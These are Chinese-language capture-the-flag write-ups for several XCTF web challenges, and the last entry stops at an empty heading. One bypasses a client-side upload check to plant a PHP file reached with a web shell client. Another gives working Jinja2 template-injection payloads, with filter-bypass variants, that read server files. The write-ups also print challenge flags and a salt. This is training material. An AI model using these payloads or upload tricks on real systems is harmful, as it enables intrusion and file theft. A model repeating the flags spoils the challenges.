# upload

## 题目链接

http://adworld.xctf.org.cn/adw/answer/4822/?type=web&level=1

## writeup

打开题目地址，发现就是一个上传页面。

尝试上传php文件的时候，发现会提示要求上传图片，但是burp中并没有抓到包，说明是前端验证。

将php文件修改为jpg文件。

在burp中抓包，然后将jpg文件的扩展名修改为php，然后点击转发，可以发现转发成功，并获取到文件地址：`upload/1544162163.one.php`

![1544162213489](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\web新手篇\assets\1544162213489.png)

接下来，我们通过菜刀连接该地址。

连接成功后，可以看到有一个文件`flag.php`，查看该文件代码，找到flag

```html
xctf{3d6cbc2a76ff7898be2076438025eff5}
```

# confusion1

## 题目来源

XCTF 4th-QCTF-2018 

## 题目链接

http://adworld.xctf.org.cn/adw/answer/4683/?type=web&level=1

## writeup

首先打开题目地址，发现就只有一个图片，一个登陆链接，一个注册链接。

查看登陆链接和注册链接，发现都是404。

这时候查看源代码，就发现404页面的源代码中有提示。

```
<!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt-->
<!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt-->
```

根据提示，可以猜测出想办法查看这个文件，就可以拿到flag了。

然后猜想404页面的url部分存在SSTI漏洞。

使用payload测试一下。

```
{{10*10}
将其urlencode
%7B%7B10*10%7D%7D
然后提交
```

最终页面返回的内容如下：

```
The requested URL /100 was not found on this server. 
```

![1544163657185](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\web新手篇\assets\1544163657185.png)

借此，说明漏洞是存在，下一步就是构造payload获取文件信息了。

构造payload

```
{{''.class.mro[2].subclasses()[40]('opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').read()}}
```

![1544163981510](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\web新手篇\assets\1544163981510.png)

发现提示让找其他办法，说明还有waf，看来还需要绕过waf才行。

那么我们就想办法绕过，我上网找了两个办法。

```
{{''['__cla'+'ss__']['__mr'+'o__'][2]['__subcla'+'sses__']()[40]('opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').next()}}
```

这个是通过在每个字母的前和后添加下划线，同时在字母中间通过符号+做拼接实现绕过。

```
{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
```

这个是通过用request.args绕过 。

最终，得到flag如下

```
QCTF{1_4m_c0nFu51ed_6y_PhPy7h000ooo000n}
```

![1544164230484](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\web新手篇\assets\1544164230484.png)

同时，将另一个提示文件salt也获取

```
_Y0uW1llN3verKn0w1t_
```

# Training-Get-Resourced

## 题目链接

http://adworld.xctf.org.cn/adw/answer/4747/?type=web&level=1

## 题目描述

一定不要把重要的东西放在注释里 

## writeup

这道题，flag就在源代码的注释里。没啥好说的。

# cetc-01

## 题目链接

http://adworld.xctf.org.cn/adw/answer/4916/?type=web&level=1

## 题目描述

工控云管理系统客服中心存在漏洞，flag就在flag/flag/flag/flag/flag/flag/flag.php文件里面 

## writeup

